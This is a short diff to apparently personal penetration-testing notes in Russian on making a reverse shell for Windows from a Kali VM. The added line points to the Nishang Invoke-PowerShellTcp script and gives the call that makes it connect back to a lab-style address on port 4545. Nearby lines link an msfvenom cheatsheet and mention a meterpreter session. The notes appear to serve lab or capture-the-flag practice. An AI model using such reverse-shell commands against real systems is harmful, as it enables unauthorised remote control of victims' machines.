@@ -36,6 +36,8 @@ Kali VM
 
 # Создаем реверс шелл для виндовс
 
+https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1 (только дописать -->     Invoke-PowerShellTcp -Reverse -IPAddress 10.18.35.17 -Port 4545)
+
 https://www.hackingarticles.in/msfvenom-cheatsheet-windows-exploitation/
 
 c meterpreter сессией
